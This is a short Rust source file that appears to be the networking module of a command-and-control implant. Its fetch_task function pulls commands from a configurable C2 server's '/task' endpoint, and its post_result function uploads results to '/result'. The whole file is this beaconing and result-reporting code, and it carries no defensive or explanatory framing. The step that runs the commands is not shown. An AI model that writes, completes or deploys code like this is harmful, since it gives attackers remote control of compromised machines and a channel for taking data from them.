use reqwest::Client;
use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Debug)]
pub struct Task {
    pub command: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Result {
    pub result: String,
}

pub async fn fetch_task(c2_url: &str) -> Option<Task> {
    let client = Client::new();
    let res = client
        .get(format!("{}/task", c2_url))
        .send()
        .await
        .ok()?
        .json::<Task>()
        .await
        .ok()?;
    Some(res)
}

pub async fn post_result(c2_url: &str, result: String) -> bool {
    let client = Client::new();
    let result_data = Result { result };
    client
        .post(format!("{}/result", c2_url))
        .json(&result_data)
        .send()
        .await
        .is_ok()
}